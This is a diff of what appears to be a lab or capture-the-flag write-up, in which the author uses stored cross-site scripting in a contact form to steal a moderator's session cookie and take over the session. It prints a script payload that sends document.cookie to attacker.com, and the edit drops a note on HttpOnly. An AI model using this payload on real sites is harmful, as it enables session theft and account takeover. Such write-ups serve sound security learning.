@@ -81,10 +81,10 @@ At this point, I connected two observations:
 
 This led me to test for **stored cross-site scripting (XSS)** and determine whether JavaScript running in the reviewer's browser could read the session cookie.
 
-I submitted a cookie-exfiltration payload that sent `document.cookie` to my listener. When the submitted message was reviewed, I received the moderator's session cookie. I then replaced my own `PHPSESSID` value with the captured value and refreshed the application.
-used xss payload - `<script>fetch('http://attacker.com/file?cookie='+document.cookie)</script>`
+I submitted a cookie-exfiltration payload that sent `document.cookie` to my listener. When the submitted message was reviewed, I received the moderator's session
+cookie. I then replaced my own `PHPSESSID` value with the captured value and refreshed the application.
 
-> **Important distinction:** `HttpOnly` being absent does not create XSS by itself. It means JavaScript can read the cookie if script execution is possible in the page. The stored XSS was the mechanism that made the cookie theft possible.
+Used xss payload - `<script>fetch('http://attacker.com/file?cookie='+document.cookie)</script>`
 
 ![Contact form after message submission](screenshots/sequence-5.png)
 
